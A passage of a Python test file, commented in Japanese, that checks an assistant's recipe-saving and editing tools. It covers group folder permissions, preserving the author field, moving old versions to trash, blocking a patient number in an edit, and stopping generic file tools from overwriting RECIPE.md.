    # 書けない層は write_file と同じ文で断る
    assert _save(
        "/ext/public/recipes/x", title="t", description="d", body="b"
    ).startswith("ERROR: ")
    assert _save(
        "/ext/groups/OTHER/recipes/x", title="t", description="d", body="b"
    ).startswith("ERROR: ")
    assert not (sbx["ext"] / "groups" / "OTHER" / "recipes").exists()


def test_save_recipe_from_path_copies_folder_without_rewriting(sbx):
    _put(
        sbx["ws"],
        "抽出",
        _md(
            title="抽出",
            description="元",
            author="佐藤",
            extra="requires:\n  - read: q.sql\n",
        ),
        **{"q.sql": "select 1"},
    )
    out = _save("/ext/groups/EMR/recipes/抽出", from_path="/workspace/recipes/抽出")
    assert out.splitlines()[0].startswith(
        "グループ「EMR」に置いた: /ext/groups/EMR/recipes/抽出/"
    )
    assert "author: 佐藤" in out  # author は写し元のまま (書いた人 山田 にしない)
    g = sbx["ext"] / "groups" / "EMR" / "recipes" / "抽出"
    assert (g / "q.sql").read_text() == "select 1"
    md = (g / "RECIPE.md").read_text()
    assert (
        "description: 元" in md and f"updated: {TODAY}" in md and "- read: q.sql" in md
    )
    assert (sbx["ws"] / "recipes" / "抽出" / "RECIPE.md").exists()  # 写し元は残る
    # もう一度写すと前の版のフォルダごとゴミ箱へ
    out = _save(
        "/ext/groups/EMR/recipes/抽出",
        from_path="/workspace/recipes/抽出",
        description="新",
    )
    assert "前の版はゴミ箱へ: /ext/groups/EMR/trash/抽出" in out
    assert (sbx["ext"] / "groups" / "EMR" / "trash" / "抽出" / "q.sql").exists()


# ---------------------------------------------------------------------------
# edit_recipe
# ---------------------------------------------------------------------------


def _edit(path, old, new, user=USER):
    return run(_tool().edit_recipe(path, old, new, __user__=user))


def test_edit_recipe_frontmatter_and_updated(sbx):
    _put(sbx["ws"], "集計", _md(updated="2026-01-01"))
    out = _edit("/workspace/recipes/集計", "title: 集計", "title: 月次集計")
    assert out.startswith(
        f"/workspace/recipes/集計/RECIPE.md の 2 行目を置き換えた (updated を今日 {TODAY} にした)。"
    )
    md = (sbx["ws"] / "recipes" / "集計" / "RECIPE.md").read_text()
    assert "title: 月次集計" in md and f"updated: {TODAY}" in md


def test_edit_recipe_repairs_broken_file(sbx):
    _put(
        sbx["ws"],
        "壊れ",
        "---\ntitle: a\ndescription: d\nauthor: 山田\nupdated: 2026-01-01\n\n本文\n",
    )
    assert "壊れている" in _recipes_text()
    out = _edit(
        "/workspace/recipes/壊れ", "updated: 2026-01-01\n", "updated: 2026-01-01\n---\n"
    )
    assert "置き換えた" in out, out
    assert _recipes_text() == "- /workspace/recipes/壊れ — d"


def test_edit_recipe_refuses_author_change_and_bad_result(sbx):
    _put(sbx["ext"] / "groups" / "EMR", "抽出", _md(author="佐藤"))
    out = _edit("/ext/groups/EMR/recipes/抽出", "author: 佐藤", "author: 山田")
    assert out.startswith("ERROR: author は変えない (このレシピの author は 佐藤)")
    out = _edit(
        "/ext/groups/EMR/recipes/抽出", "1. 集める", "1. 患者番号 12345678 を集める"
    )
    assert out.startswith("ERROR: 直した後の検査で止めた (何も書いていない):")
    out = _edit("/ext/groups/EMR/recipes/抽出", "1. 集める", "1. 数える")
    assert "author: 佐藤 (グループ「EMR」のレシピ)" in out
    assert (
        out.splitlines()[-1]
        == "返答への指示: 直した場所 (/ext/groups/EMR/recipes/抽出/) と誰のレシピか (author) を 1 行で伝える"
    )


def test_edit_recipe_match_rules(sbx):
    _put(sbx["ws"], "集計", _md(body="a\na\n"))
    assert "一致する箇所が無い" in _edit("/workspace/recipes/集計", "zzz", "y")
    assert "2 か所ある" in _edit("/workspace/recipes/集計", "a\n", "b\n")
    assert "save_recipe" in _edit("/workspace/recipes/無い", "a", "b")


# ---------------------------------------------------------------------------
# 抜け道
# ---------------------------------------------------------------------------


def test_write_and_edit_file_refuse_recipe_md_but_allow_attachments(sbx):
    tool = _tool()
    out = run(tool.write_file("/workspace/recipes/集計/RECIPE.md", "x", __user__=USER))
    assert out.startswith(
        "ERROR: /workspace/recipes/集計/RECIPE.md はレシピの本体 (RECIPE.md)"
    )
    assert "save_recipe" in out and "edit_recipe" in out
    _put(sbx["ws"], "集計", _md())
    out = run(
        tool.edit_file("/workspace/recipes/集計/RECIPE.md", "集計", "x", __user__=USER)
    )
    assert out.startswith("ERROR: ") and "edit_recipe" in out
    out = run(
        tool.write_file("/workspace/recipes/集計/q.sql", "select 1", __user__=USER)
    )
    assert "書き込んだ" in out


def test_read_file_adds_load_recipe_hint(sbx):
    _put(sbx["ws"], "集計", _md())
    out = run(_tool().read_file("/workspace/recipes/集計/RECIPE.md", __user__=USER))
    out = getattr(out, "text", out)
    assert out.rstrip().endswith("レシピは load_recipe(path) で読み込む。")
